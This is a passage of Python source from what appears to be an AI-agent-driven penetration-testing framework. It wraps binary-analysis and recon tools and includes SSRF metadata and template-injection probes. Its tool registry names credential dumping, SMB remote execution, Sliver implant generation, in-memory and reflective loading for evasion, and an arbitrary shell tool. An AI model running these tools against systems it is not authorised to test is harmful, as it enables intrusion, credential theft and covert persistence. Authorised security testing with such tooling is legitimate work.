        analyze_cmd = shutil.which("analyzeHeadless")

    if analyze_cmd and Path(analyze_cmd).exists():
        project_dir = tempfile.mkdtemp(prefix="ghidra_")
        project_name = "phalanx_analysis"
        script_path = Path(project_dir) / "FindStringsScript.java"
        script_path.write_text("""
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.*;
import java.util.*;
public class FindStringsScript extends GhidraScript {
    @Override
    protected void run() throws Exception {
        List<String> interesting = new ArrayList<>();
        DataIterator data = currentProgram.getListing().getDefinedData(true);
        while (data.hasNext()) {
            Data d = data.next();
            if (d.getValue() instanceof String) {
                String s = (String) d.getValue();
                if (s.length() > 4 && s.matches(".*[a-zA-Z0-9_].*")) {
                    if (s.contains("pass") || s.contains("key") || s.contains("token") || s.contains("admin"))
                        interesting.add(s);
                }
            }
        }
        println("INTERESTING_STRINGS:" + String.join(",", interesting));
    }
}
""")
        cmd = [analyze_cmd, project_dir, project_name, "-import", binary_path, "-postScript", str(script_path)]
        try:
            res = _execute_in_sandbox(cmd, timeout, config=config)
            output = res["output"]
            interesting = []
            if "INTERESTING_STRINGS:" in output:
                part = output.split("INTERESTING_STRINGS:")[1].splitlines()[0]
                interesting = part.split(",")
            functions_count = output.count("Function at")
            shutil.rmtree(project_dir, ignore_errors=True)
            return {
                "tool": "ghidra_analyze",
                "target": binary_path,
                "output": output,
                "parsed": {
                    "functions_count": functions_count,
                    "interesting_strings": interesting[:10],
                    "vulnerabilities": []
                },
                "error": res["error"],
                "rc": res["rc"]
            }
        except Exception as e:
            shutil.rmtree(project_dir, ignore_errors=True)
            logger.warning(f"Ghidra analysis failed: {e}, falling back to basic tools")

    result = {
        "tool": "ghidra_analyze",
        "target": binary_path,
        "output": "",
        "parsed": {
            "functions_count": 0,
            "interesting_strings": [],
            "vulnerabilities": []
        },
        "error": None,
        "rc": 0
    }
    output_lines = []
    try:
        file_res = subprocess.run(["file", binary_path], capture_output=True, text=True, timeout=10)
        if file_res.returncode == 0:
            output_lines.append(f"File info: {file_res.stdout.strip()}")
            result["parsed"]["file_type"] = file_res.stdout.strip()
    except Exception as e:
        logger.warning(f"file command failed: {e}")

    try:
        strings_res = subprocess.run(["strings", binary_path], capture_output=True, text=True, timeout=60)
        if strings_res.returncode == 0:
            all_strings = strings_res.stdout.splitlines()
            interesting_patterns = ['pass', 'key', 'token', 'secret', 'admin', 'password', 'api_key', 'auth', 'credential']
            interesting = [s for s in all_strings if any(p in s.lower() for p in interesting_patterns)]
            result["parsed"]["interesting_strings"] = interesting[:20]
            output_lines.append(f"Found {len(interesting)} interesting strings (e.g., {interesting[0] if interesting else 'none'})")
    except Exception as e:
        logger.warning(f"strings command failed: {e}")

    try:
        objdump_res = subprocess.run(["objdump", "-T", binary_path], capture_output=True, text=True, timeout=30)
        if objdump_res.returncode == 0:
            func_lines = [l for l in objdump_res.stdout.splitlines() if 'DF' in l or 'FUNC' in l]
            result["parsed"]["functions_count"] = len(func_lines)
            output_lines.append(f"Found {len(func_lines)} function symbols")
    except Exception as e:
        logger.warning(f"objdump command failed: {e}")

    result["output"] = "\n".join(output_lines)
    if not result["parsed"]["interesting_strings"] and result["parsed"]["functions_count"] == 0:
        result["error"] = "Ghidra not installed and basic analysis limited. Install Ghidra: sudo apt install ghidra"

    return result

# ------------------------------------------------------------------
# New OGhidra Tool Runners – with improved analyzeHeadless detection and temp cleanup
# ------------------------------------------------------------------
def run_oghidra_analyze(binary_path: str, task_mode: str = "smart", config: dict = None) -> Dict:
    """
    Run OGhidra analysis on a binary using analyzeHeadless.
    task_mode: "malware", "smart", "full", "rename_only"
    """
    # Locate analyzeHeadless
    analyze_headless = shutil.which("analyzeHeadless")
    if not analyze_headless:
        ghidra_install = os.environ.get("GHIDRA_INSTALL_DIR")
        if ghidra_install:
            analyze_headless = str(Path(ghidra_install) / "support" / "analyzeHeadless")
            if not Path(analyze_headless).exists():
                return {"tool": "oghidra", "error": "analyzeHeadless not found. Set GHIDRA_INSTALL_DIR or install Ghidra.", "rc": -1}
        else:
            return {"tool": "oghidra", "error": "GHIDRA_INSTALL_DIR not set and analyzeHeadless not in PATH.", "rc": -1}
    
    # Check if OGhidraMCP plugin is installed
    plugin_path = _find_oghidra_plugin_path()
    if not plugin_path:
        return {"tool": "oghidra", "error": "OGhidraMCP plugin not found. Run phalanx_extra.py --setup-oghidra.", "rc": -1}
    
    # Use temporary directory for output, ensure cleanup in all paths
    output_dir = None
    try:
        output_dir = Path(tempfile.mkdtemp(prefix="oghidra_"))
        output_file = output_dir / f"{Path(binary_path).stem}_result.json"
        project_dir = output_dir / "project"
        project_dir.mkdir(exist_ok=True)
        
        # Build command with proper arguments
        cmd = [
            analyze_headless,
            str(project_dir), "OGhidraProject",
            "-import", str(binary_path),
            "-scriptPath", str(plugin_path),
            "-postScript", "OGhidraMCP.py",
            "-scriptArgs", f"task={task_mode},output={str(output_file)}"
        ]
        
        logger.info(f"Running OGhidra analysis: {' '.join(cmd)}")
        res = _execute_in_sandbox(cmd, timeout=600, config=config)
        
        if output_file.exists():
            try:
                data = json.loads(output_file.read_text())
                return {
                    "tool": "oghidra",
                    "target": binary_path,
                    "output": res.get("output", ""),
                    "parsed": data,
                    "rc": 0
                }
            except Exception as e:
                logger.error(f"Failed to parse OGhidra output: {e}")
                return {"tool": "oghidra", "target": binary_path, "output": res.get("output", ""), "rc": -1}
        else:
            return {"tool": "oghidra", "target": binary_path, "output": res.get("output", ""), "rc": res.get("rc", -1)}
    finally:
        if output_dir is not None:
            try:
                shutil.rmtree(output_dir, ignore_errors=True)
            except Exception:
                pass

def run_oghidra_conversational(binary_path: str, query: str, config: dict = None) -> Dict:
    """Conversational analysis with OGhidra - ask questions about the binary."""
    # Start OGhidra MCP server if not running
    if not _is_oghidra_mcp_running():
        _start_oghidra_mcp(binary_path)
    
    # Send query to MCP server
    try:
        resp = requests.post(
            "http://localhost:8080/query",
            json={"query": query, "binary": binary_path},
            timeout=60
        )
        if resp.status_code == 200:
            return {
                "tool": "oghidra_chat", 
                "query": query, 
                "response": resp.json(), 
                "rc": 0,
                "output": json.dumps(resp.json(), indent=2)
            }
        else:
            return {
                "tool": "oghidra_chat",
                "query": query,
                "error": f"MCP server returned {resp.status_code}",
                "rc": -1
            }
    except Exception as e:
        return {"tool": "oghidra_chat", "query": query, "error": str(e), "rc": -1}

# ------------------------------------------------------------------
# New tools: cloud metadata probe and template injection test
# ------------------------------------------------------------------
def run_cloud_metadata_probe(target: str, timeout=30, config=None) -> Dict:
    """Test common SSRF/cloud metadata endpoints."""
    if not shutil.which("curl"):
        return {"tool": "cloud_metadata_probe", "target": target, "output": "", "error": "curl not found.", "rc": -1}
    urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/"
    ]
    results = {}
    for url in urls:
        res = _execute_with_scope(["curl", "-s", "-m", "5", url], target, timeout, config)
        results[url] = res["output"][:200]
    output = json.dumps(results, indent=2)
    return {"tool": "cloud_metadata_probe", "target": target, "output": output, "rc": 0}

def run_template_injection_test(target: str, timeout=60, config=None) -> Dict:
    """Basic template injection probe using common payloads."""
    if not shutil.which("curl"):
        return {"tool": "template_injection_test", "target": target, "output": "", "error": "curl not found.", "rc": -1}
    payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}"]
    results = {}
    for payload in payloads:
        test_url = f"{target}?test={payload}"
        res = _execute_with_scope(["curl", "-s", test_url], target, timeout, config)
        if "49" in res["output"] or "49" in res.get("error", ""):
            results[payload] = "Potential injection detected"
        else:
            results[payload] = "No immediate eval"
    output = json.dumps(results, indent=2)
    return {"tool": "template_injection_test", "target": target, "output": output, "rc": 0}

# ======================================================================
# NEW: REVERSE ENGINEERING TOOLS
# ======================================================================
def run_jadx(target: str, timeout: int = 300, config: Optional[dict] = None) -> Dict:
    """Decompile APK/DEX using jadx."""
    if not shutil.which("jadx"):
        return {"tool": "jadx", "target": target, "output": "", "error": "jadx not found. Install via: apt install jadx or brew install jadx", "rc": -1}
    if not Path(target).exists():
        return {"tool": "jadx", "target": target, "output": "", "error": f"File not found: {target}", "rc": -1}
    out_dir = str(Path(target).parent / "jadx_output")
    cmd = ["jadx", "-d", out_dir, target, "--show-bad-code"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "jadx", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_apktool(target: str, timeout: int = 120, config: Optional[dict] = None) -> Dict:
    """Decode APK using apktool."""
    if not shutil.which("apktool"):
        return {"tool": "apktool", "target": target, "output": "", "error": "apktool not found. Install via: apt install apktool or brew install apktool", "rc": -1}
    if not Path(target).exists():
        return {"tool": "apktool", "target": target, "output": "", "error": f"File not found: {target}", "rc": -1}
    out_dir = Path(target).stem + "_apktool"
    cmd = ["apktool", "d", target, "-o", out_dir, "-f"]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "apktool", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_frida_script(target: str, script_path: str = None, timeout: int = 60, config: Optional[dict] = None) -> Dict:
    """Run Frida script on a running process (target = process name or PID)."""
    if not shutil.which("frida"):
        return {"tool": "frida", "target": target, "output": "", "error": "frida not found. Install via: pip install frida-tools", "rc": -1}
    if script_path and not Path(script_path).exists():
        return {"tool": "frida", "target": target, "output": "", "error": f"Script not found: {script_path}", "rc": -1}
    cmd = ["frida", "-n", target, "-l", script_path] if script_path else ["frida", "-n", target]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "frida", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_ida_auto(target: str, script: str = None, timeout: int = 600, config: Optional[dict] = None) -> Dict:
    """Run IDA Pro in batch mode (requires idat or ida64)."""
    ida = shutil.which("ida64") or shutil.which("idat")
    if not ida:
        return {"tool": "ida", "target": target, "output": "", "error": "IDA Pro not found. Install manually and add to PATH.", "rc": -1}
    if not Path(target).exists():
        return {"tool": "ida", "target": target, "output": "", "error": f"File not found: {target}", "rc": -1}
    cmd = [ida, "-B", "-A"]
    if script:
        cmd.extend(["-S" + script])
    cmd.append(target)
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "ida", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_radare2(target: str, commands: str = "aaa", timeout: int = 120, config: Optional[dict] = None) -> Dict:
    """Run radare2 analysis with given commands."""
    if not shutil.which("r2"):
        return {"tool": "radare2", "target": target, "output": "", "error": "radare2 not found. Install via: apt install radare2 or brew install radare2", "rc": -1}
    if not Path(target).exists():
        return {"tool": "radare2", "target": target, "output": "", "error": f"File not found: {target}", "rc": -1}
    cmd = ["r2", "-q", "-c", commands, target]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "radare2", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_ollvm_deobfuscate(binary_path: str, timeout: int = 300, config: Optional[dict] = None) -> Dict:
    """Deobfuscate OLLVM-protected binary using known tools (e.g., deobfuscate scripts)."""
    # Placeholder – implement actual deobfuscation logic if needed.
    return {"tool": "ollvm_deobfuscate", "target": binary_path, "output": "OLLVM deobfuscation not implemented yet", "error": None, "rc": 0}

def run_js_reverse(target: str, url: str = None, timeout: int = 120, config: Optional[dict] = None) -> Dict:
    """Reverse engineer frontend JS: fetch and analyze for encryption parameters."""
    if not target and not url:
        return {"tool": "js_reverse", "target": target, "output": "", "error": "Need target file or URL", "rc": -1}
    # If target is a file
    if target and Path(target).exists():
        if shutil.which("js-beautify"):
            cmd = ["js-beautify", target]
            res = _execute_in_sandbox(cmd, timeout, config=config)
            return {"tool": "js_reverse", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}
        else:
            try:
                content = Path(target).read_text()
                keys = re.findall(r'(?:key|secret|token|signature)\s*[:=]\s*["\']([^"\']+)["\']', content, re.I)
                output = f"Found potential keys: {keys[:5]}\nContent preview: {content[:500]}"
                return {"tool": "js_reverse", "target": target, "output": output, "error": None, "rc": 0}
            except Exception as e:
                return {"tool": "js_reverse", "target": target, "output": "", "error": str(e), "rc": -1}
    elif url:
        try:
            r = requests.get(url, timeout=timeout)
            content = r.text
            keys = re.findall(r'(?:key|secret|token|signature)\s*[:=]\s*["\']([^"\']+)["\']', content, re.I)
            output = f"Found potential keys: {keys[:5]}\nContent preview: {content[:500]}"
            return {"tool": "js_reverse", "target": url, "output": output, "error": None, "rc": 0}
        except Exception as e:
            return {"tool": "js_reverse", "target": url, "output": "", "error": str(e), "rc": -1}
    else:
        return {"tool": "js_reverse", "target": target, "output": "", "error": "No valid input", "rc": -1}

# ======================================================================
# RAPTOR-LOOP-HUNT ROUND-0 HELPER
# ======================================================================
def run_raptor_round0(target: str, config: Optional[dict] = None) -> Dict:
    """
    Deterministic Round-0 front-load for Raptor loop (Raptor-Loop-Hunt style).
    Performs inventory, SCA (software composition analysis), prior-art recon,
    threat-model STRIDE, and Semgrep anchors (static analysis) without using LLM budget.

    The target can be a network host (domain/IP) or a local file/directory path.
    Returns a structured dictionary with findings and metadata.

    This function is designed to be called by the RaptorLoopEngine before any
    generative or adversarial steps.
    """
    if config is None:
        config = {}

    results = {
        "target": target,
        "inventory": {},
        "sca": {},
        "prior_art": {},
        "threat_model": {"STRIDE": {}},
        "semgrep": {},
        "findings": []
    }

    # Helper to add findings
    def add_finding(category: str, description: str, severity: str = "info", metadata: Dict = None):
        results["findings"].append({
            "category": category,
            "description": description,
            "severity": severity,
            "metadata": metadata or {}
        })

    target_path = Path(target)
    if target_path.exists():
        # ---------- LOCAL FILE/DIRECTORY INVENTORY ----------
        if target_path.is_dir():
            # Walk directory
            try:
                files = list(target_path.rglob("*"))
                results["inventory"]["file_count"] = len(files)
                ext_count = {}
                for f in files:
                    if f.is_file():
                        ext = f.suffix.lower()
                        ext_count[ext] = ext_count.get(ext, 0) + 1
                results["inventory"]["extensions"] = ext_count
                results["inventory"]["top_extensions"] = sorted(ext_count.items(), key=lambda x: -x[1])[:10]
                add_finding("inventory", f"Directory scan: {len(files)} files, {len(ext_count)} unique extensions", "info")
            except Exception as e:
                add_finding("error", f"Failed to inventory directory: {e}", "error")

            # Basic secret scanning with grep (if available)
            try:
                grep_cmd = ["grep", "-r", "-i", "-E", "password|secret|key|token|api_key|credentials", str(target_path)]
                grep_res = _execute_local(grep_cmd, timeout=60)
                if grep_res["rc"] == 0:
                    # Limit output
                    matches = grep_res["output"].splitlines()[:20]
                    results["semgrep"]["secrets_found"] = matches
                    if matches:
                        add_finding("semgrep", f"Found {len(matches)} potential secrets in files", "high", {"matches": matches})
            except Exception as e:
                add_finding("error", f"Secret scan failed: {e}", "error")

        else:
            # Single file
            # file type
            file_cmd = ["file", str(target_path)]
            file_res = _execute_local(file_cmd, timeout=10)
            results["inventory"]["file_type"] = file_res["output"]
            add_finding("inventory", f"File type: {file_res['output'][:100]}", "info")

            # strings
            strings_cmd = ["strings", str(target_path)]
            strings_res = _execute_local(strings_cmd, timeout=60)
            if strings_res["rc"] == 0:
                all_strings = strings_res["output"].splitlines()
                results["inventory"]["strings_count"] = len(all_strings)
                results["inventory"]["strings_preview"] = all_strings[:20]
                # Look for interesting strings
                interesting_patterns = ['pass', 'key', 'token', 'secret', 'admin', 'password', 'api_key', 'credential', 'private', '-----BEGIN']
                interesting = [s for s in all_strings if any(p in s.lower() for p in interesting_patterns)]
                if interesting:
                    results["semgrep"]["interesting_strings"] = interesting[:20]
                    add_finding("semgrep", f"Found {len(interesting)} interesting strings (passwords, keys, etc.)", "medium", {"examples": interesting[:5]})

            # If binary, run Ghidra analysis (if available)
            if "ELF" in file_res["output"] or "PE32" in file_res["output"] or "Mach-O" in file_res["output"]:
                add_finding("sca", "Binary detected, running Ghidra analysis", "info")
                try:
                    ghidra_res = run_ghidra_analyze(str(target_path), config=config)
                    if ghidra_res.get("rc", -1) == 0:
                        parsed = ghidra_res.get("parsed", {})
                        results["sca"]["ghidra"] = parsed
                        func_count = parsed.get("functions_count", 0)
                        interesting_strings = parsed.get("interesting_strings", [])
                        if interesting_strings:
                            add_finding("sca", f"Ghidra found {len(interesting_strings)} interesting strings", "medium", {"strings": interesting_strings[:10]})
                        add_finding("sca", f"Ghidra analyzed binary with {func_count} functions", "info")
                    else:
                        add_finding("error", f"Ghidra analysis failed: {ghidra_res.get('error', 'Unknown error')}", "error")
                except Exception as e:
                    add_finding("error", f"Ghidra exception: {e}", "error")

        # Prior-art recon: searchsploit if we have a service name? skip for local.

    else:
        # ---------- NETWORK TARGET ----------
        # Quick nmap for open ports
        add_finding("inventory", "Running nmap quick scan on network target", "info")
        nmap_res = run_nmap_quick(target, config=config)
        results["inventory"]["nmap"] = nmap_res.get("output", "")
        if nmap_res.get("rc", -1) == 0:
            # Try to extract service names
            service_lines = re.findall(r'(\d+)/\w+\s+open\s+(\S+)', nmap_res["output"])
            if service_lines:
                services = [s for _, s in service_lines]
                results["inventory"]["services"] = services
                add_finding("inventory", f"Found {len(services)} services: {', '.join(services[:5])}", "info", {"services": services})

        # Nuclei for vulnerabilities (critical/high)
        add_finding("sca", "Running nuclei vulnerability scan", "info")
        nuclei_res = run_nuclei(target, severity="critical,high", config=config)
        if nuclei_res.get("rc", -1) == 0:
            parsed = nuclei_res.get("parsed", {})
            findings = parsed.get("findings", [])
            results["sca"]["nuclei"] = findings
            if findings:
                add_finding("sca", f"Nuclei found {len(findings)} high/critical vulnerabilities", "high", {"findings": findings[:5]})
            else:
                add_finding("sca", "Nuclei found no high/critical vulnerabilities", "info")

        # Whatweb for technology fingerprint
        add_finding("inventory", "Running whatweb technology fingerprint", "info")
        whatweb_res = run_whatweb(target, config=config)
        if whatweb_res.get("rc", -1) == 0:
            results["inventory"]["whatweb"] = whatweb_res["output"]
            add_finding("inventory", f"Whatweb identified technologies: {whatweb_res['output'][:100]}", "info")

        # Prior-art: searchsploit for service names if we have any
        services = results["inventory"].get("services", [])
        if services:
            for service in services[:3]:
                searchsploit_res = run_searchsploit(service, config=config)
                if searchsploit_res.get("rc", -1) == 0 and searchsploit_res["output"]:
                    results["prior_art"][service] = searchsploit_res["output"]
                    add_finding("prior_art", f"Searchsploit found exploits for {service}", "medium", {"output": searchsploit_res["output"][:200]})

    # Threat-model STRIDE placeholder – can be enhanced with rules
    results["threat_model"]["STRIDE"] = {
        "Spoofing": "Check for weak authentication, session management",
        "Tampering": "Check for integrity issues (e.g., no TLS, lack of signing)",
        "Repudiation": "Check for logging and auditing gaps",
        "Information Disclosure": "Check for excessive data exposure, sensitive info in responses",
        "Denial of Service": "Check for rate limiting, resource exhaustion vectors",
        "Elevation of Privilege": "Check for IDOR, privilege escalation paths"
    }
    add_finding("threat_model", "STRIDE threat model generated (placeholder)", "info")

    # Return aggregated results
    return results

# ======================================================================
# END OF RAPTOR-LOOP-HUNT ROUND-0 HELPER
# ======================================================================

# ------------------------------------------------------------------
# Helper functions for impacket tools (already defined)
# ------------------------------------------------------------------
def _impacket_secretsdump_wrapper(target: str, args="", username="", password="", domain="", config=None):
    return run_impacket(target, "secretsdump", args, username, password, domain, config=config)

def _impacket_smbexec_wrapper(target: str, args="", username="", password="", domain="", config=None):
    return run_impacket(target, "smbexec", args, username, password, domain, config=config)

# ------------------------------------------------------------------
# Tool registry with all functions (thread-safe)
# ------------------------------------------------------------------
_TOOL_REGISTRY_LOCK = threading.RLock()
TOOL_REGISTRY: Dict[str, Dict] = {}
SKILL_REGISTRY: Dict[str, Dict] = {}

def _init_registries():
    with _TOOL_REGISTRY_LOCK:
        if TOOL_REGISTRY:
            return
        registry_entries = {
            # Core recon
            "nmap":           {"fn": run_nmap,           "desc": "Full port scan", "tags": ["recon", "network"], "parser": parse_nmap_output},
            "nmap_quick":     {"fn": run_nmap_quick,     "desc": "Fast top-1000 scan", "tags": ["recon", "network"], "parser": parse_nmap_output},
            "whois":          {"fn": run_whois,          "desc": "WHOIS lookup", "tags": ["recon", "osint"]},
            "dig":            {"fn": run_dig,            "desc": "DNS lookup", "tags": ["recon", "dns"]},
            "subfinder":      {"fn": run_subfinder,      "desc": "Subdomain enumeration", "tags": ["recon", "dns"], "parser": parse_subfinder_output},
            "theharvester":   {"fn": run_theharvester,   "desc": "Email/domain OSINT", "tags": ["osint"]},
            "enum4linux":     {"fn": run_enum4linux,     "desc": "SMB enumeration", "tags": ["recon", "smb"]},
            "httpx":          {"fn": run_httpx,          "desc": "Live host probing", "tags": ["recon", "web"], "parser": parse_httpx_output},
            "nuclei":         {"fn": run_nuclei,         "desc": "Vulnerability scanner", "tags": ["recon", "vuln"], "parser": parse_nuclei_output},
            "naabu":          {"fn": run_naabu,          "desc": "Fast port scanner", "tags": ["recon", "network"], "parser": parse_naabu_output},
            "katana":         {"fn": run_katana,         "desc": "Web crawler", "tags": ["recon", "web"]},
            "dnsx":           {"fn": run_dnsx,           "desc": "DNS enumeration", "tags": ["recon", "dns"]},
            "gau":            {"fn": run_gau,            "desc": "Passive URL gathering", "tags": ["recon", "osint"]},
            "nikto":          {"fn": run_nikto,          "desc": "Web vulnerability scanner", "tags": ["web", "vuln"]},
            "whatweb":        {"fn": run_whatweb,        "desc": "Web technology fingerprint", "tags": ["web", "recon"]},
            "gobuster":       {"fn": run_gobuster,       "desc": "Directory brute‑force", "tags": ["web", "bruteforce"]},
            "ffuf":           {"fn": run_ffuf,           "desc": "Web fuzzing", "tags": ["web", "bruteforce"]},
            "wpscan":         {"fn": run_wpscan,         "desc": "WordPress scanner", "tags": ["web", "cms"]},
            "scrape":         {"fn": run_scrape,         "desc": "Web scraping (emails, links)", "tags": ["web", "osint"], "parser": parse_scrape_output},
            "wp_scanner":     {"fn": run_wp_scanner,     "desc": "Custom WordPress vulnerability scanner", "tags": ["web", "cms", "wordpress"]},
            
            # Web exploit / injection
            "sqlmap":         {"fn": run_sqlmap,         "desc": "Full SQL injection", "tags": ["exploit", "sqli"], "parser": parse_sqlmap_output},
            "sqlmap_detect":  {"fn": run_sqlmap_detect,  "desc": "SQLi detection (safe)", "tags": ["exploit", "sqli"], "parser": parse_sqlmap_output},
            "crlfuzz":        {"fn": run_crlfuzz,        "desc": "CRLF injection scanner", "tags": ["web", "injection"]},
            "dalfox":         {"fn": run_dalfox,         "desc": "XSS scanner", "tags": ["web", "xss"]},
            "xsstrike":       {"fn": run_xsstrike,       "desc": "Advanced XSS scanner", "tags": ["web", "xss"]},
            
            # Framework / binary
            "msfconsole":     {"fn": run_msfconsole,     "desc": "Metasploit resource script or interactive", "tags": ["exploit", "framework"]},
            "metasploit":     {"fn": run_metasploit,     "desc": "Alias for msfconsole", "tags": ["exploit", "framework"]},
            "searchsploit":   {"fn": run_searchsploit,   "desc": "Exploit database search", "tags": ["exploit"]},
            "ghidra_analyze": {"fn": run_ghidra_analyze, "desc": "Ghidra binary analysis", "tags": ["recon", "binary"], "parser": parse_ghidra_output},
            
            # Post‑exploitation / C2
            "impacket_secretsdump": {"fn": _impacket_secretsdump_wrapper, "desc": "Dump credentials (with domain auth)", "tags": ["post", "creds"]},
            "impacket_smbexec":     {"fn": _impacket_smbexec_wrapper, "desc": "SMB command exec (with domain auth)", "tags": ["post", "smb"]},
            "secretsdump":    {"fn": run_secretsdump,    "desc": "Impacket secretsdump (alias, supports domain auth)", "tags": ["post", "creds"]},
            "getnpusers":     {"fn": run_getnpusers,     "desc": "Impacket GetNPUsers (AS-REP roast, supports domain auth)", "tags": ["post", "windows"]},
            "impacket_getnpusers": {"fn": run_impacket_getnpusers, "desc": "Impacket GetNPUsers (AS-REP roast, supports domain auth)", "tags": ["post", "windows"]},
            "sliver_generate": {"fn": run_sliver_generate, "desc": "Generate Sliver implant", "tags": ["c2"]},
            "sliver_sessions": {"fn": run_sliver_sessions, "desc": "List Sliver sessions", "tags": ["c2"]},
            "stealth_rce":    {"fn": run_stealth_rce,    "desc": "In‑memory ELF execution", "tags": ["exploit", "evasion"]},
            
            # OSINT / compliance
            "copyright_osint": {"fn": run_copyright_osint, "desc": "Copyright OSINT scan", "tags": ["osint", "compliance"]},
            "burp_scan":      {"fn": run_burp_scan,      "desc": "Burp Suite scan", "tags": ["web", "vuln"]},
            "cloud_metadata_probe": {"fn": run_cloud_metadata_probe, "desc": "Cloud metadata SSRF probe", "tags": ["recon", "ssrf"]},
            "template_injection_test": {"fn": run_template_injection_test, "desc": "Template injection probe", "tags": ["exploit", "ssti"]},
            
            # Additional recommended tools
            "feroxbuster":    {"fn": run_feroxbuster,    "desc": "Fast directory brute forcer", "tags": ["web", "bruteforce"]},
            "testssl":        {"fn": run_testssl,        "desc": "TLS/SSL security scanner", "tags": ["network", "crypto"]},
            "masscan":        {"fn": run_masscan,        "desc": "Very fast port scanner", "tags": ["recon", "network"]},
            
            # Wi‑Fi scanning (LavaWall)
            "airodump":       {"fn": run_airodump,       "desc": "Wi‑Fi environment scan using airodump‑ng", "tags": ["network", "wifi", "lavawall"]},
            
            # LavaWall Wi‑Fi scan wrapper for agent
            "lavawall_wifi_scan": {
                "fn": run_lavawall_wifi_scan,
                "desc": "Scan the Wi‑Fi environment for suspicious devices, rogue APs, and RF tracking threats.",
                "tags": ["lavawall", "wifi", "recon"],
                "parser": None
            },
            
            # WinStealth Windows evasion (renamed from sindri_load)
            "winstealth_load": {"fn": run_winstealth_load, "desc": "Reflectively load a PE using WinStealth (Windows evasion)", "tags": ["windows", "evasion"], "parser": None},

            # ===== REVERSE ENGINEERING TOOLS =====
            "jadx":           {"fn": run_jadx,          "desc": "Decompile APK/DEX", "tags": ["reverse", "android"]},
            "apktool":        {"fn": run_apktool,       "desc": "Decode APK resources", "tags": ["reverse", "android"]},
            "frida":          {"fn": run_frida_script,  "desc": "Run Frida script on process", "tags": ["reverse", "dynamic"]},
            "ida":            {"fn": run_ida_auto,      "desc": "IDA Pro batch analysis", "tags": ["reverse", "binary"]},
            "radare2":        {"fn": run_radare2,       "desc": "radare2 analysis", "tags": ["reverse", "binary"]},
            "ollvm_deobfuscate": {"fn": run_ollvm_deobfuscate, "desc": "OLLVM deobfuscation", "tags": ["reverse", "binary"]},
            "js_reverse":     {"fn": run_js_reverse,    "desc": "Reverse JS encryption/signatures", "tags": ["reverse", "web"]},
            # ===== OGhidra Tools =====
            "oghidra":        {"fn": run_oghidra_analyze, "desc": "OGhidra AI‑powered binary analysis (malware, smart, full)", "tags": ["reverse", "binary", "malware"], "parser": parse_oghidra_output},
            "oghidra_chat":   {"fn": run_oghidra_conversational, "desc": "Conversational analysis with OGhidra – ask questions about the binary", "tags": ["reverse", "binary", "chat"]},
            # ===== Raptor Tools =====
            "raptor_round0": {"fn": run_raptor_round0, "desc": "Deterministic Round-0 front-load for Raptor loop: inventory, SCA, prior-art, STRIDE, Semgrep anchors", "tags": ["raptor", "recon"], "parser": None},
            # ===== SHELL TOOL =====
            "shell":          {"fn": run_shell_command, "desc": "Execute arbitrary shell command (dangerous, opt-in)", "tags": ["shell", "system"], "parser": None},
        }
        TOOL_REGISTRY.update(registry_entries)

        skill_entries = {
            "nmap":           {"phase": "recon", "mitre": ["T1595", "T1046"], "desc": "Port scanning"},
            "nmap_quick":     {"phase": "recon", "mitre": ["T1595"], "desc": "Fast port scan"},
            "whois":          {"phase": "recon", "mitre": ["T1591"], "desc": "WHOIS lookup"},
            "dig":            {"phase": "recon", "mitre": ["T1590.002"], "desc": "DNS enumeration"},
            "subfinder":      {"phase": "recon", "mitre": ["T1590.002"], "desc": "Subdomain discovery"},
            "theharvester":   {"phase": "recon", "mitre": ["T1591"], "desc": "Email/domain OSINT"},
            "enum4linux":     {"phase": "recon", "mitre": ["T1590.005"], "desc": "SMB enumeration"},
            "httpx":          {"phase": "recon", "mitre": ["T1595.002"], "desc": "Live host probing"},
            "nuclei":         {"phase": "recon", "mitre": ["T1595.002"], "desc": "Vulnerability scanning"},
            "naabu":          {"phase": "recon", "mitre": ["T1046"], "desc": "Fast port scanner"},
            "katana":         {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web crawler"},
            "dnsx":           {"phase": "recon", "mitre": ["T1590.002"], "desc": "DNS enumeration"},
            "gau":            {"phase": "recon", "mitre": ["T1595.002"], "desc": "Passive URL gathering"},
            "nikto":          {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web vuln scanner"},
            "whatweb":        {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web technology fingerprint"},
            "gobuster":       {"phase": "recon", "mitre": ["T1595.002"], "desc": "Directory brute‑force"},
            "ffuf":           {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web fuzzing"},
            "wpscan":         {"phase": "recon", "mitre": ["T1595.002"], "desc": "WordPress scanner"},
            "scrape":         {"phase": "recon", "mitre": ["T1593"], "desc": "Web scraping"},
            "wp_scanner":     {"phase": "recon", "mitre": ["T1595.002"], "desc": "Custom WordPress scanner (CVE detection)"},
            "sqlmap":         {"phase": "exploit", "mitre": ["T1190"], "desc": "SQL injection"},
            "sqlmap_detect":  {"phase": "exploit", "mitre": ["T1190"], "desc": "SQLi detection"},
            "crlfuzz":        {"phase": "exploit", "mitre": ["T1190"], "desc": "CRLF injection"},
            "dalfox":         {"phase": "exploit", "mitre": ["T1190"], "desc": "XSS scanner"},
            "xsstrike":       {"phase": "exploit", "mitre": ["T1190"], "desc": "Advanced XSS"},
            "msfconsole":     {"phase": "exploit", "mitre": ["T1190", "T1210"], "desc": "Metasploit"},
            "metasploit":     {"phase": "exploit", "mitre": ["T1190", "T1210"], "desc": "Metasploit"},
            "searchsploit":   {"phase": "exploit", "mitre": ["T1588.005"], "desc": "Exploit database search"},
            "impacket_secretsdump": {"phase": "post", "mitre": ["T1003"], "desc": "Dump credentials"},
